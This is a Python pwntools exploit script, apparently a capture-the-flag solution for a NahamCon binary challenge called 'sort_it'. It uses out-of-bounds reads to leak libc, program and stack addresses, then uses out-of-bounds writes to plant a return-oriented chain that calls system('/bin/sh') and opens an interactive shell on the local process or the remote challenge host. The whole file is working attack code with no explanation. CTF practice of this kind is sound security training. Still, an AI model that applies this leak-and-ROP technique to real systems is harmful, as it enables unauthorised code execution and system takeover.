#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./sort_it_patched')

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 32674)
	libc = ELF('./libc-2.31.so')
else:
	p = process(binary.path)
	libc = binary.libc


# get libc address
p.sendlineafter('continue...','')
p.sendlineafter('select: ','1')
p.sendlineafter('with: ','14')
p.recvuntil('1. ')
_ = p.recv(6)
libc_start_main = u64(_ + b'\0\0') - 243
libc.address = libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))
p.sendlineafter('[y/n]: ','n')

# get main address
p.sendlineafter('select: ','1')
p.sendlineafter('with: ','18')
p.recvuntil('1. ')
_ = p.recv(6)
main = u64(_ + b'\0\0')
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))
log.info('yn: ' + hex(binary.sym.yn))
p.sendlineafter('[y/n]: ','n')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

# get stack address
p.sendlineafter('select: ','1')
p.sendlineafter('with: ','11')
p.recvuntil('1. ')
_ = p.recv(6)
stack = u64(_ + b'\0\0') - (0x00007fffffffe470 - 0x00007fffffffe320)
log.info('1. element: ' + hex(stack))
p.sendlineafter('[y/n]: ','n')
p.sendlineafter('select: ','1')
p.sendlineafter('with: ','11')
p.sendlineafter('[y/n]: ',8*b'n' + p64(pop_rdi+1))

# rop chain
line = 14

# pop_rdi + 1
p.sendlineafter('select: ',str(line))
p.sendlineafter('with: ',str((binary.sym.yn-stack)//8+2))
p.sendlineafter('[y/n]: ',8*b'n' + p64(pop_rdi))

# pop_rdi 
line += 1
p.sendlineafter('select: ',str(line))
p.sendlineafter('with: ',str((binary.sym.yn-stack)//8+2))
p.sendlineafter('[y/n]: ',8*b'n' + p64(libc.search(b'/bin/sh').__next__()))

# /bin/sh address
line += 1
p.sendlineafter('select: ',str(line))
p.sendlineafter('with: ',str((binary.sym.yn-stack)//8+2))
p.sendlineafter('[y/n]: ',8*b'n' + p64(libc.sym.system))

# system call
line += 1
p.sendlineafter('select: ',str(line))
p.sendlineafter('with: ',str((binary.sym.yn-stack)//8+2))
p.sendlineafter('[y/n]: ',8*b'n' + b'A\0')

# shit we really do have to sort, or override, or do we?  just change it all to A
for i in range(10):
	p.sendlineafter('select: ',str(i+1))
	p.sendlineafter('with: ',str((binary.sym.yn-stack)//8+2))
	if i < 9:
		p.sendlineafter('[y/n]: ',8*b'n' + b'A\0')
	else:
		p.sendlineafter('[y/n]: ','y')

p.interactive()
